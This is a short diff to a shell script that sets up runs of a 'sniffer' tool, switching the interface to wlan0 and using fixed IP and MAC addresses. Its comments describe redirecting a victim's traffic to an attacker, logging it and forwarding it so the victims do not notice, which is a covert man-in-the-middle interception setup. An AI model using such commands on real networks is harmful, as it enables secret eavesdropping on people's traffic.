@@ -3,7 +3,7 @@
 # is happening.
 
 a="./sniffer \
-run0 \
+wlan0 \
 192.168.43.1 \
 b4:3a:28:63:e6:ab \
 192.168.43.108 \
@@ -11,14 +11,12 @@ b4:3a:28:63:e6:ab \
 #$a
 
 
-
-
 # Redirects the victim traffic to the attacker with first command.
 # Then bridge log the traffic to the standard output and forward
 # them so the victims do not know that someting is happening.
 
 b="./sniffer \
-run0 \
+wlan0 \
 192.168.43.1 \
 b4:3a:28:63:e6:ab \
 192.168.43.108 \
@@ -36,7 +34,7 @@ $b
 # do not know that someting is happening.
 
 c="./sniffer \
-run0 \
+wlan0 \
 192.168.43.1 \
 b4:3a:28:63:e6:ab \
 192.168.43.108 \
